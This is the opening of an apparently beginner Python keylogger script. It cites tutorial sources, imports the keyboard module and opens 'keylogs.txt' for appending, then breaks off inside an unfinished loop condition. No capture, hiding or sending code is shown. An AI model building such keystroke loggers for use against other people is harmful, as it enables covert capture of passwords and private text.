# sources: https://www.w3schools.com/python/python_file_write.asp, https://www.geeksforgeeks.org/python/how-to-detect-if-a-specific-key-pressed-using-python/, https://www.w3schools.com/python/python_datetime.asp

import keyboard
import datetime

file = open("keylogs.txt", "a")

while True:
    if 